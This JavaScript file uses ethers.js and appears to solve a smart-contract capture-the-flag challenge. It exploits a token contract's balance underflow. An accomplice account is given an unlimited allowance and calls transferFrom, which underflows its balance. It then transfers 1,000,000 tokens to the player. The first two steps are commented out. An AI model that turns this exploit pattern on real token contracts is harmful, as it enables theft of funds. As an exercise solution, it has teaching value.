
const { utils, BigNumber, Contract } = require('ethers');

var { wallet, provider, accomplice } = require('./common')

const contractAddress = '0x8150A20a37152AE9ECd06a63d55Ef8aF3E083c84';

async function main() {
	const iface = new utils.Interface([
		'function name() view returns (string)',
		'function approve(address spender, uint256 value)',
		'function totalSupply() view returns (uint256)',
		'function transferFrom(address from, address to, uint256 value)',
		'function decimals() view returns (uint8)',
		'function balanceOf(address) view returns (uint256)',
		'function symbol() view returns (string)',
		'function transfer(address to, uint256 value)',
		'function isComplete() view returns (bool)',
		'function allowance(address, address) view returns (uint256)',
		'constructor(address _player)',
		'event Transfer(address indexed from, address indexed to, uint256 value)',
		'event Approval(address indexed owner, address indexed spender, uint256 value)' //
	]);
	const aoeAddress = await wallet.getAddress();
	const accompliceAddress = await accomplice.getAddress();

	const Max = BigNumber.from(2).pow(256).sub(1);

	// // 1. approve the accomplice
	// var contract = new Contract(contractAddress, iface, provider);
	// var contractWithSigner = contract.connect(wallet);

	// var player = await provider.getStorageAt(contractAddress, 0);
	// console.log("player: ", player);

	// var tx = await contractWithSigner.approve(accompliceAddress, Max);
	// var result = await tx.wait();
	// console.log('buy result  : ', result);

	// // 2. transferFrom
	// var contract = new Contract(contractAddress, iface, provider);
	// var contractAccomplice = contract.connect(accomplice);

	// var tx = await contractAccomplice.transferFrom(aoeAddress, aoeAddress, 1);
	// console.log("tx: ", tx);
	// var result = await tx.wait();
	// console.log('transferFrom result : ', result);

	// 3. transfer
	var contract = new Contract(contractAddress, iface, provider);
	var contractAccomplice = contract.connect(accomplice);

	var tx = await contractAccomplice.transfer(aoeAddress, 1000000);
	console.log("tx: ", tx);
	var result = await tx.wait();
	console.log('transfer result : ', result);
}

main().catch(console.error);